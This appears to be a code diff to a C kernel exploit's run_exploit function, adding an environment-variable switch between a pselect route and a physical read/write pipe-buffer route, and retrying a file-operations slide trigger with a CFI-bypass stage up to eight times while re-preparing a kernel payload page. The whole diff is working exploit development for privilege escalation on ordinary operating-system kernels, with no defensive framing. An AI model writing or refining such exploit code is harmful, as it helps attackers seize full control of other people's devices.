@@ -230,11 +230,16 @@ int run_exploit(int argc, char **argv) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  int app_original_route = getenv("APP_USE_ORIGINAL_PSELECT") != NULL;
   reset_pipe_attempt();
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
-  if (!is_direct_ptr(pipebuf_page_base)) {
-    return 1;
+  if (!app_original_route) {
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+    if (!is_direct_ptr(pipebuf_page_base)) {
+      return 1;
+    }
+  } else {
+    pr_info("app route=original-pselect; deferring physrw pipe preparation\n");
   }
 #endif
 
@@ -245,14 +250,26 @@ int run_exploit(int argc, char **argv) {
   if (!page_base) {
     return 1;
   }
-  for (int attempt = 1; attempt <= 1; attempt++) {
-    int triggered = app_trigger_fops_slide_route();
-    int verified = triggered && try_cfi_stage();
-    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
-            "step=%d errno=%d\n",
-            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
-    if (verified || cfi_dirty_seen) {
-      break;
+  if (app_original_route) {
+    run_main_route_threads();
+  } else {
+    for (int attempt = 1; attempt <= 8; attempt++) {
+      if (attempt != 1) {
+        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+        if (!page_base) {
+          pr_error("app fops retry page prepare failed attempt=%d/8 errno=%d\n",
+                   attempt, errno);
+          break;
+        }
+      }
+      int triggered = app_trigger_fops_slide_route();
+      int verified = triggered && try_cfi_stage();
+      pr_info("app fops slide attempt=%d/8 triggered=%d verified=%d "
+              "step=%d errno=%d\n",
+              attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+      if (verified || cfi_dirty_seen) {
+        break;
+      }
     }
   }
 #else
